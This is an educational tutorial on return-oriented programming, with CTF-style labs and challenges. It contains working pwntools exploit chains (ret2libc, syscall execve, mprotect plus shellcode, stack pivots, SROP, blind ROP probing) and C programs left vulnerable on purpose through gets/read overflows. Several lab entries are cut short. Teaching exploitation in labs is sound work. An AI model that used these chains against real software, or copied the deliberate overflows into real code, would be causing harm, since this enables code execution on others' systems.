Return Oriented Programming

Core Concept

ROP is the universal bypass for NX/DEP. Instead of injecting code, you chain snippets of existing code (gadgets) ending in ret.

; Example gadgets:
pop rdi; ret            ; load value from stack into RDI
pop rsi; pop r15; ret   ; load two values from stack
mov rdi, rsp; ret       ; set RDI to current stack pointer
syscall; ret            ; make a system call

How Chains Work

Stack layout (RSP at top):
┌─────────────────────┐ ← RSP
│ addr of gadget_1     │ → pop rdi; ret
├─────────────────────┤
│ value for RDI        │ ← popped into RDI by gadget_1
├─────────────────────┤
│ addr of gadget_2     │ → pop rsi; pop r15; ret
├─────────────────────┤
│ value for RSI        │ ← popped into RSI
├─────────────────────┤
│ junk (for r15)       │ ← popped into R15 (don't care)
├─────────────────────┤
│ addr of system       │ → system(RDI) gets called
└─────────────────────┘

Finding Gadgets

# ROPgadget
ROPgadget --binary ./binary | grep "pop rdi"
ROPgadget --binary ./binary --ropchain     # auto-generate chain

# ropper
ropper -f ./binary --search "pop rdi"
ropper -f ./binary --search "mov qword ptr"

# pwntools
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address

# In libc (much larger gadget set)
ROPgadget --binary ./libc.so.6 | grep "pop rdi"

Common Gadget Patterns

GadgetPurpose
pop rdi; retSet arg1 (most common)
pop rsi; pop r15; retSet arg2 (ignore r15)
pop rdx; retSet arg3 (rare in small binaries)
pop rax; retSet syscall number
syscall; retExecute syscall
pop rsp; retStack pivot
leave; retStack pivot (mov rsp, rbp; pop rbp)
mov [rdi], rsi; retWrite-what-where
retStack alignment (16-byte)

Classic ROP Chains

ret2libc: system("/bin/sh")

from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address

payload = flat(
    b'A' * offset,
    ret,                                     # 16-byte alignment
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),       # pointer to "/bin/sh"
    libc.symbols['system'],
)

ret2plt Libc Leak + Return to Main

# Stage 1: Leak libc via puts@plt(GOT[puts])
payload1 = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],       # address stored in GOT
    elf.plt['puts'],       # calls puts() with GOT entry as arg
    elf.symbols['main'],   # return to main for stage 2
)
p.sendline(payload1)

# Parse leaked address
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']

# Stage 2: system("/bin/sh") with known libc base
payload2 = flat(
    b'A' * offset,
    ret,
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    libc.symbols['system'],
)
p.sendline(payload2)

Syscall Chain: execve("/bin/sh", NULL, NULL)

# For statically linked binaries or when you have syscall gadgets
# execve syscall number = 59 (0x3b)

# Need: pop rax, pop rdi, pop rsi, pop rdx, syscall
# Also need "/bin/sh" somewhere writable

# Write "/bin/sh" to bss using write-what-where gadgets
# Then:
payload = flat(
    b'A' * offset,
    pop_rax, 59,                   # rax = 59 (execve)
    pop_rdi, bss_binsh_addr,       # rdi = "/bin/sh"
    pop_rsi, 0,                    # rsi = NULL (argv)
    pop_rdx, 0,                    # rdx = NULL (envp)
    syscall_ret,                   # syscall
)

mprotect ROP Chain

When to use:

  • ✅ Statically linked (with mprotect())
  • ✅ NX Enabled
  • ❌ No PIE
  • ✅ Arbitrary write or can read shellcode to bss
#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'

binary = "./vulnerable"
elf = ELF(binary)
rop = ROP(elf)

# mprotect(bss_page, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
payload = b'A' * offset
payload += p64(rop.rdi[0])
payload += p64(elf.bss() & ~0xfff)  # page-aligned bss address
payload += p64(rop.rsi[0])
payload += p64(0x1000)               # size = page size
payload += p64(rop.rdx[0])
payload += p64(0x7)                  # PROT_READ | PROT_WRITE | PROT_EXEC
payload += p64(elf.sym.mprotect)

# Jump to shellcode in bss
off = 0x200
payload += p64(elf.bss(off))

with process(binary) as r:
    r.send(payload)
    r.sendline(asm(shellcraft.sh()))
    r.interactive()

Stack Pivot

# When the overflow is too small for a full ROP chain:
# Pivot the stack to a controlled buffer (bss, heap, etc.)

# Method 1: pop rsp; ret
payload = b'A' * offset
payload += p64(pop_rsp)
payload += p64(controlled_buffer)   # RSP now points here
# Execution continues from the ROP chain at controlled_buffer

# Method 2: leave; ret (mov rsp, rbp; pop rbp; ret)
# Control RBP via overflow, then use leave;ret
payload = b'A' * buf_size
payload += p64(controlled_buffer)   # overwrite saved RBP
payload += p64(leave_ret)           # leave: RSP = RBP; pop RBP
# RSP now points to controlled_buffer + 8

SIGROP (Sigreturn-Oriented Programming)

# Uses sigreturn syscall to set ALL registers at once
# Requires: syscall gadget, sigreturn frame on stack
from pwn import *

frame = SigreturnFrame()
frame.rax = 59                            # execve
frame.rdi = bss_binsh                     # "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.rsp = 0xdeadbeef                    # doesn't matter

payload = b'A' * offset
payload += p64(pop_rax) + p64(15)         # rax = 15 (sigreturn)
payload += p64(syscall_addr)
payload += bytes(frame)

Lab 1: Basic ROP — ret2win with Gadgets

Easy

Objective: Use a pop rdi gadget to pass an argument to a function.

// rop1.c - gcc -o rop1 rop1.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>

void win(int arg) {
    if (arg == 0xdeadbeef) {
        system("/bin/sh");
    } else {
        printf("Wrong arg: 0x%x\n", arg);
    }
}

void vuln() {
    char buf[64];
    printf("ROP me: ");
    gets(buf);
}

int main() { vuln(); }

Task: You can't just jump to win() — you need to set RDI = 0xdeadbeef first. Use ROPgadget to find pop rdi; ret and build a chain.

Lab 2: ret2libc — Leak + Shell

Medium

Objective: Perform a two-stage exploit: leak libc, return to main, call system("/bin/sh").

// rop2.c - gcc -o rop2 rop2.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>

void vuln() {
    char buf[64];
    printf(">> ");
    gets(buf);
}

int main() {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}

Steps:

  1. Stage 1: Use puts@plt to leak puts@GOT → libc address
  2. Return to main for a second overflow
  3. Calculate libc base from leak
  4. Stage 2: Call system("/bin/sh") with correct libc addresses
  5. Remember stack alignment!

Lab 6: ret2csu — __libc_csu_init Gadget

Hard

Objective: Use the universal __libc_csu_init gadgets to control RDX and call a function with three arguments.

// rop6.c - gcc -o rop6 rop6.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>

void win(long a, long b, long c) {
    if (a == 0x1337 && b == 0xdead && c == 0xbeef) {
        system("/bin/sh");
    }
}

void vuln() {
    char buf[64];
    printf("csu> ");
    gets(buf);
}

int main() {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}

Task: There is no pop rdx; ret gadget in this binary. Use the two gadgets in __libc_csu_init: the "pop" gadget (pop rbx, rbp, r12, r13, r14, r15; ret) and the "call" gadget (mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]). Set all three args and call win().

# Skeleton
csu_pop = elf.sym['__libc_csu_init'] + 0x5a  # pop rbx..r15; ret
csu_call = elf.sym['__libc_csu_init'] + 0x40 # mov rdx,r14; mov rsi,r13; call [r15+rbx*8]

payload = flat(
    b'A' * offset,
    csu_pop,
    0,              # rbx = 0
    1,              # rbp = 1 (rbx+1 == rbp to skip jne)
    0x1337,         # r12 → edi (arg1, truncated to 32-bit)
    0xdead,         # r13 → rsi (arg2)
    0xbeef,         # r14 → rdx (arg3)
    elf.got['win'], # r15 → call [r15 + rbx*8]
    csu_call,
    # 7 pops follow (add rsp,8 + 6 pops), then ret
    b'A' * 56,
    elf.sym['win'], # or next gadget
)

Lab 7: SROP — Sigreturn-Oriented Programming

Hard

Objective: Craft a SigreturnFrame to call execve and get a shell on a minimal binary.

; rop7.asm - nasm -f elf64 rop7.asm && ld -o rop7 rop7.o
; Minimal binary: only read() and syscall available
section .text
global _start

_start:
    ; read(0, rsp, 0x400)
    xor eax, eax          ; syscall 0 = read
    xor edi, edi          ; fd = 0 (stdin)
    mov rsi, rsp          ; buf = rsp
    mov edx, 0x400        ; count
    syscall
    ret                   ; pivot into our input

section .data
    binsh db "/bin/sh", 0

Task: Build a SigreturnFrame using pwntools. The chain: write address of pop rax; ret → 15 (rt_sigreturn) → syscall address → SigreturnFrame bytes. The frame sets RAX=59, RDI=addr_of_binsh, RSI=0, RDX=0, RIP=syscall_addr. Note: the "syscall; ret" at _start IS your syscall gadget.

Lab 8: mprotect + Shellcode Execution

Hard

Objective: Use ROP to call mprotect() making a memory region executable, then jump to injected shellcode.

Lab 11: PIE + ASLR — Full Bypass ROP

Hard

Objective: Defeat PIE and ASLR by leaking both a binary address and a libc address, then ROP to shell.

#include <stdio.h>

Lab 12: xchg-Based Stack Pivot

Hard

Objective: Use an xchg rax, rsp; ret gadget to pivot the stack to a heap-allocated buffer.

// rop12.c - gcc -o rop12 rop12.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vuln() {
    char *heap_buf = malloc(0x1000);
    char stack_buf[16];

    printf("heap_buf @ %p\n", heap_buf);

    printf("payload> ");
    read(0, heap_buf, 0x1000);    // large payload on heap

    printf("trigger> ");
    read(0, stack_buf, 40);        // small overflow on stack
}

int main() {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}

Task: The stack overflow is only 24 bytes past the buffer — room for RBP + 1 gadget. Use the following pivot strategy:

# Stage 1: Write full ROP chain to heap_buf
# Stage 2: Overflow stack_buf:
#   padding + pop_rax + heap_buf_addr + xchg_rax_rsp_ret
# The xchg swaps RAX (heap_buf) with RSP → execution continues from heap
# Full ROP chain on heap: ret2libc, execve, etc.

Challenge 1: ROPchain 101

Easy

A binary has a function that opens a file, but it needs two arguments set correctly via ROP.

// ropctf1.c - gcc -o ropctf1 ropctf1.c -fno-stack-protector -no-pie
#include <stdio.h>

int main() {

Need two arguments: find pop rdi; ret and pop rsi; pop r15; ret (or just pop rsi; ret). Chain: padding + pop_rdi + 0xcafebabe + pop_rsi_r15 + 0xd00dface + junk + print_flag.

Challenge 4: Triple Threat

Medium

Call a function that requires three arguments. The binary has very few gadgets — no pop rdx; ret.

// ropctf4.c - gcc -o ropctf4 ropctf4.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>

void vault(long key1, long key2, long key3) {
    if (key1 == 0xaa && key2 == 0xbb && key3 == 0xcc) {
        system("cat flag.txt");
    }
}

int main() {
    char buf[56];
    setbuf(stdout, NULL);
    printf("keys> ");
    gets(buf);
    return 0;
}

No pop rdx; ret in a small binary? Use __libc_csu_init gadgets: the pop gadget loads r12-r15, and the call gadget moves r14→rdx, r13→rsi, r12d→edi. Set rbx=0, rbp=1, and r15 to a pointer to vault (use its GOT entry or a pointer in .data). After the call gadget, 7 values are popped before the next ret.

Challenge 6: Blind ROP

Hard

No binary provided. The remote service has a buffer overflow. Discover gadgets and exploit it blind (BROP attack).

# The remote service:
# - Forks on each connection (same memory layout)
# - Has a stack overflow in a read() call
# - Crashes if return address is wrong, hangs/prints if correct
#
# BROP Attack Steps:
# 1. Find overflow offset (try lengths until crash)
# 2. Probe for "stop gadgets" (addresses that don't crash)
# 3. Find PLT entries by scanning for PLT stub patterns
# 4. Find pop rdi; ret by probing __libc_csu_init offset
# 5. Use puts@plt to dump the binary from memory
# 6. With the dumped binary, do a normal ret2libc

from pwn import *

def probe(addr):
    """Test if jumping to addr crashes or returns"""
    r = remote('challenge', 9001)
    payload = b'A' * offset + p64(addr) + p64(stop_gadget)
    r.send(payload)
    try:
        r.recv(timeout=1)
        return True  # didn't crash
    except:
        return False

Key insight: if the server forks, the address space is identical each time. Scan for stop gadgets (addresses that cause the program to output something rather than crash). Then find the PLT: it has a regular stride (0x10 bytes). Once you find puts@plt and pop rdi, you can dump the binary from memory. Use write(1, addr, len) or puts(addr) to dump GOT, then pivot to ret2libc.

Challenge 7: Sigreturn Sandbox

Hard

A sandboxed binary blocks execve via seccomp. Use SROP to call open/read/write and exfiltrate the flag.

; ropctf7.asm
; seccomp filter: blocks execve (59), allows open/read/write
section .text
global _start
_start:
    ; install seccomp filter (blocks execve)
    ; ... (seccomp setup omitted) ...

    ; read(0, rsp, 0x800)
    xor eax, eax
    xor edi, edi
    mov rsi, rsp
    mov edx, 0x800
    syscall
    ret

section .data
    flag_path db "flag.txt", 0

Chain three SigreturnFrames: Frame 1: open("flag.txt", O_RDONLY) → RSP points to frame2 trigger. Frame 2: read(fd, bss_buf, 0x100) (fd is the return value from open, usually 3). Frame 3: write(1, bss_buf, 0x100). Set each frame's RSP to point to the next pop rax; 15; syscall sequence + next frame.

Medium

A small dynamically linked binary with almost no useful gadgets. Get a shell using only what's available.

Challenge 9: PIE Leaker

Hard

PIE enabled. Leak a code pointer from the stack, compute the binary base, then chain to a libc leak and shell.

// ropctf9.c - gcc -o ropctf9 ropctf9.c -fno-stack-protector -pie
#include <stdio.h>

void vuln() {
    char buf[48];
    printf("pie> ");
    int n = read(0, buf, 0x100);
    buf[n] = '\0';
    printf("Echo: %s\n", buf);  // format string? no, but printf stops at \0
}

int main() {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}

Fill the buffer up to — but not overwriting — the saved RBP and return address. Since printf prints until null and the buffer is contiguous with the stack frame, you can leak the saved RBP (stack addr) and return address (PIE code addr). Parse the leak: pie_base = leaked_ret_addr - known_offset. Now you have the binary base and can use PLT/GOT for a libc leak. Second stage: ret2libc with known bases.

Challenge 10: dl-resolve Deception

Hard

No output functions (no puts, no printf after overflow). Use ret2dlresolve to call system without any leaks.

// ropctf10.c - gcc -m32 -o ropctf10 ropctf10.c -fno-stack-protector -no-pie
#include <unistd.h>

int main() {
    char msg[] = "input:\n";
    write(1, msg, 7);
    char buf[64];
    read(0, buf, 0x200);
    return 0;
}

Use pwntools Ret2dlresolvePayload. The strategy: ROP to read(0, bss, len) to stage fake ELF structures (.rel.plt, .dynsym, .dynstr entries for "system") in .bss. Then call plt_init (PLT[0]) with a fake reloc_index that points to your forged entries. Challenge 11: Multi-Stage Madness

Hard

Three-stage exploit: leak canary, leak libc, then ROP to shell. Each stage returns to the vulnerable function.

// ropctf11.c - gcc -o ropctf11 ropctf11.c -no-pie
// Note: stack canary IS enabled (default)
#include <stdio.h>

void vuln() {
    char buf[40];
    printf("msg> ");
    read(0, buf, 0x100);
    printf("Echo: %s\n", buf);
}

int main() {
    setbuf(stdout, NULL);
    while(1) { vuln(); }
    return 0;
}

Stage 1: Overwrite buf up to and including the canary's null byte (buf[40] = canary starts here, first byte is \x00). The printf leak reveals the canary's remaining 7 bytes. Stage 2: Now that you know the canary, overflow past it and overwrite the return address with a puts@plt(GOT[puts]) + vuln chain to leak libc. Stage 3: Full ret2libc with the known canary and libc base. Each stage returns to vuln() (the while loop helps).

Challenge 12: Static Siege

Medium

Statically linked binary with no libc to leak. Build a pure syscall ROP chain to read the flag file.

// ropctf12.c - gcc -o ropctf12 ropctf12.c -static -fno-stack-protector -no-pie

int main() {

In a static binary, you have thousands of gadgets. Chain: (1) Write "flag.txt\0" to .bss using pop rdi; pop rsi; mov [rdi], rsi. (2) open(bss, 0) via syscall 2.
